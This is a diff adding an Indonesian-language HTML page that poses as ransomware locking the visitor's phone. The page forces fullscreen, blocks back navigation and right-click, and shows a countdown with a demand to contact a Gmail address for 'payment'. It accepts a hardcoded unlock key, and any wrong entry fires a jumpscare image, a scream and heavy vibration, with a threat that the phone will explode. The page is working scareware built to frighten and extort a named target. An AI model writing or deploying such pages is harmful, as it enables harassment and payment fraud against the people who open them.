@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEM TERKUNCI - VOLTAGE DEATH</title>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; touch-action: none; }
+        body { background: #000; color: #ff0000; font-family: 'Orbitron', sans-serif; height: 100vh; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #lock-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, #200000 0%, #000 100%); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 12px solid #f00; }
+        h1 { font-family: 'Creepster', cursive; font-size: 3.5em; text-shadow: 0 0 20px #ff0000; animation: shake 0.1s infinite; text-align: center; }
+        @keyframes shake { 0% { transform: translate(2px, 2px); } 50% { transform: translate(-3px, -1px); } 100% { transform: translate(2px, 2px); } }
+        .timer { font-size: 3em; color: #fff; margin: 15px 0; text-shadow: 0 0 10px #f00; }
+        .box-info { background: rgba(255,0,0,0.1); padding: 15px; border-radius: 5px; width: 90%; margin-bottom: 20px; border-left: 5px solid #f00; font-size: 0.9em; }
+        input { width: 85%; padding: 15px; background: #111; border: 2px solid #ff0000; color: #0f0; text-align: center; font-size: 1.2em; outline: none; margin-bottom: 10px; }
+        button { padding: 15px 50px; background: #ff0000; color: #fff; border: none; font-weight: bold; text-transform: uppercase; cursor: pointer; }
+        #scare { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://p16-capcut-va.ibyteimg.com/tos-alis-i-bv960005-us/7074127521746206725~tplv-nh78v94f-1.image') no-repeat center; background-size: cover; display: none; z-index: 10000; }
+    </style>
+</head>
+<body onclick="startInfection()" oncontextmenu="return false;">
+
+    <div id="lock-screen">
+        <h1>MAU BUKA?</h1>
+        <p style="color: #fff; margin-bottom: 10px;">Sistem lu udah gw pegang, Cel! 👑</p>
+        <div class="timer" id="timer">23:59:59</div>
+        <div class="box-info">
+            <p>KIRIM KE EMAIL INI: <strong style="color: #0f0;">JELEKLU@gmail.com</strong></p>
+            <p>KIRIM KODE <strong style="color: #0f0;">63781</strong> UNTUK DAPAT PEMBAYARAN BIAR HP LU BISA KEBUKA!</p>
+        </div>
+        <input type="text" id="key" placeholder="MASUKKAN KODE DEKRIPSI">
+        <button onclick="checkKey()">BUKA SEKARANG</button>
+    </div>
+
+    <div id="scare"></div>
+    <audio id="scream-audio" src="https://www.soundboard.com/handler/Downloadaudio.ashx?id=438345"></audio>
+
+    <script>
+        // TEKNIK NO-ESCAPE & AUTO-BRIGHTNESS 👑
+        history.pushState(null, null, location.href);
+        window.onpopstate = function () { history.go(1); };
+
+        async function startInfection() {
+            // Fullscreen paksa
+            let el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            
+            // Auto WakeLock (Layar gak bakal mati/redup)
+            if ('wakeLock' in navigator) {
+                try { await navigator.wakeLock.request('screen'); } catch (err) {}
+            }
+        }
+
+        // Timer maut
+        let timeLeft = 86400;
+        setInterval(() => {
+            timeLeft--;
+            let h = Math.floor(timeLeft / 3600);
+            let m = Math.floor((timeLeft % 3600) / 60);
+            let s = timeLeft % 60;
+            document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }, 1000);
+
+        function checkKey() {
+            const k = document.getElementById('key').value;
+            const audio = document.getElementById('scream-audio');
+            const scare = document.getElementById('scare');
+
+            if (k === "ACEL_KING_666") {
+                alert("SISTEM DIPULIHKAN. 😈");
+                window.location.href = "about:blank";
+            } else {
+                // COMBO JUMPSCARE + VIBRATE BRUTAL ☠️
+                scare.style.display = "block";
+                audio.play();
+                if ("vibrate" in navigator) navigator.vibrate([1000, 50, 1000, 50, 2000]);
+                setTimeout(() => {
+                    scare.style.display = "none";
+                    alert("KODE SALAH! HP LU MAU MELEDAK... 💀");
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
+
